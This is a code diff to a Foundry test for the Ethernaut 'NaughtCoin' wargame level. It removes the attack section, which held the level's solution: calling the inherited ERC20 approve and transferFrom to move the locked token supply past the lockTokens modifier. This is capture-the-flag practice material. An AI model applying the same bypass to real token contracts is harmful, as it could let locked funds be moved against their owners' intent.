@@ -29,28 +29,6 @@ contract NaughtCoinTest is Test {
         /****************
          *    Attack     *
          *************** */
-        /*
-         * This challenge is to teach us not to relly on the available function.
-         * The contract inherit from ERC20, so eventhough we don't see the function
-         * We can call them. And they are not protected by lockTokens modifier !
-         */
-
-        uint256 playerBalance = ethernautNaughtCoin.balanceOf(player);
-        ethernautNaughtCoin.approve(
-            player,
-            ethernautNaughtCoin.INITIAL_SUPPLY()
-        );
-        ethernautNaughtCoin.transferFrom(
-            player,
-            player2,
-            ethernautNaughtCoin.INITIAL_SUPPLY()
-        );
-        // uint256 player2Balance = ethernautNaughtCoin.balanceOf(player);
-
-        //make sure contract balance is 0.
-        assertEq((address(ethernautNaughtCoin).balance), 0);
-        assertEq(ethernautNaughtCoin.balanceOf(player), 0);
-        assertEq(ethernautNaughtCoin.balanceOf(player2), playerBalance);
 
         /*****************
          *Level Submission*
